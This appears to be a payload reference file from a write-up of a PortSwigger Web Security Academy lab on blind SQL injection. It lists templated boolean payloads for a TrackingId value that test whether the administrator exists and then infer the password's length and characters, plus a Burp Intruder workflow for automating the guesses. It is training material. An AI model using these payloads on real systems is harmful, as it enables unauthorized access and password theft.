@@ -1,0 +1,102 @@
+
+---
+
+# 3️⃣ `payloads.txt`
+
+```text
+# Payload Reference — Blind SQL Injection with Conditional Responses
+
+# Platform:
+# PortSwigger Web Security Academy
+#
+# These payloads are documented for the authorized training lab
+# used in this exercise.
+
+==================================================
+1. BASELINE
+==================================================
+
+TrackingId=<original-value>
+
+Purpose:
+Establish the application's normal response before testing.
+
+
+==================================================
+2. BOOLEAN CONDITION
+==================================================
+
+<value>' AND (<condition>)='a
+
+Purpose:
+Introduce a Boolean SQL condition into the injection context.
+
+
+==================================================
+3. ADMINISTRATOR EXISTENCE CHECK
+==================================================
+
+(SELECT 'a' FROM users WHERE username='administrator')='a'
+
+Purpose:
+Determine whether the administrator record satisfies the condition.
+
+
+==================================================
+4. PASSWORD LENGTH INFERENCE
+==================================================
+
+(SELECT 'a' FROM users
+WHERE username='administrator'
+AND LENGTH(password)>N)='a'
+
+Where:
+
+N = candidate password length
+
+
+==================================================
+5. PASSWORD CHARACTER INFERENCE
+==================================================
+
+(SELECT SUBSTRING(password,P,1) FROM users
+WHERE username='administrator'
+AND SUBSTRING(password,P,1)='C')='a'
+
+Where:
+
+P = password character position
+
+C = candidate character
+
+
+==================================================
+6. BURP INTRUDER
+==================================================
+
+Burp Suite Intruder can be used to automate repetitive candidate testing.
+
+General workflow:
+
+1. Select the dynamic value as the payload position.
+2. Configure a controlled candidate set.
+3. Start the attack.
+4. Compare response characteristics.
+5. Identify the response corresponding to TRUE.
+6. Verify the result manually.
+
+
+==================================================
+7. IMPORTANT
+==================================================
+
+Payload syntax depends on:
+
+- Database engine
+- Injection context
+- Encoding
+- Application behavior
+- Query structure
+
+A payload that works in a PortSwigger training lab should not
+automatically be assumed to work against another application.
